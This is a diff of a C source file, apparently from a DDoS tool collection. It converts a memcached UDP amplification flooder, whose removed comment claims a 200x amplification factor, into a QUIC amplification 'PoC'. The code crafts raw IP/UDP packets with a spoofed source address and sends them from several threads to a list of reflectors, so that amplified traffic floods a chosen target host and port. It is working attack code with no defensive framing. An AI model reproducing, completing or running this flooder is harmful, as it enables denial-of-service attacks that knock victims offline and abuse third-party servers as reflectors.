@@ -1,7 +1,6 @@
 /*-------------------------------
-Meme-cacheD amplification on the dumb template C script. 
-Working in 2020 with 200x amplification factor.
-Dumb C socket template modified to perform memcached by Phenomite.
+QUIC PRST Amplification PoC on the dumb template C script.
+- Phenomite
 -------------------------------*/
 #include <arpa/inet.h>
 #include <netinet/ip.h>
@@ -14,14 +13,14 @@ Dumb C socket template modified to perform memcached by Phenomite.
 #include <time.h>
 #include <unistd.h>
 
-#define MAX_PACKET_SIZE 4096
-#define PHI 0x9e3779b9
-static uint32_t Q[4096], c = 362436;
-static unsigned int DPORT = 11211;
+static unsigned int DPORT = 80; // or 443!
+static const char PAYLOAD[] =
+    "\x0e\x00\x00\x00\x00\x00\x00\x00\x00";
 
-/* Use the memcached-seeder.py to populate the list IP's with these memcached
- * key values! */
-static const char PAYLOAD[] = "\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n";
+// Phenomite template begin
+#define MAX_PACKET_SIZE 4096
+#define PHI 0xaaf219b9
+static uint32_t Q[4096], c = 362436;
 static unsigned int PAYLOADSIZE = sizeof(PAYLOAD) - 1;
 
 struct list {
@@ -80,15 +79,15 @@ void setup_ip_header(struct iphdr *iph) {
   iph->version = 4;
   iph->tos = 0;
   iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOADSIZE;
-  iph->id = htonl(rand() % 65337 + 1);
+  iph->id = htonl(61337);
   iph->frag_off = 0;
-  iph->ttl = 64; // MAXTTL
+  iph->ttl = MAXTTL;
   iph->protocol = IPPROTO_UDP;
   iph->check = 0;
   iph->saddr = inet_addr("127.0.0.1");
 }
 void setup_udp_header(struct udphdr *udph) {
-  udph->source = htons(rand() % 65337 + 80);
+  udph->source = htons(61337);
   udph->dest = htons(DPORT);
   udph->check = 0;
   memcpy((void *)udph + sizeof(struct udphdr), PAYLOAD, PAYLOADSIZE);
@@ -110,7 +109,7 @@ void *flood(void *par1) {
   memset(datagram, 0, MAX_PACKET_SIZE);
   setup_ip_header(iph);
   setup_udp_header(udph);
-  udph->source = htons(rand() % 65337 + 80); // Avoid first 80
+  udph->source = htons(tehport);
   iph->saddr = sin.sin_addr.s_addr;
   iph->daddr = list_node->data.sin_addr.s_addr;
   iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
@@ -140,15 +139,18 @@ void *flood(void *par1) {
 }
 int main(int argc, char *argv[]) {
   if (argc < 6) {
-    fprintf(stdout, "%s hst prt ref thread lim time\n", argv[0]);
+    fprintf(stdout, "%s host port listfile threads limit[-1 for none] time\n",
+            argv[0]);
     exit(-1);
   }
   srand(time(NULL));
   int i = 0;
   head = NULL;
-  int max_len = 128;
+  fprintf(stdout, "Loading list to buffer\n");
+  int max_len = 512;
   char *buffer = (char *)malloc(max_len);
   buffer = memset(buffer, 0x00, max_len);
+  tehport = atoi(argv[2]);
   int num_threads = atoi(argv[4]);
   int maxpps = atoi(argv[5]);
   limiter = 0;
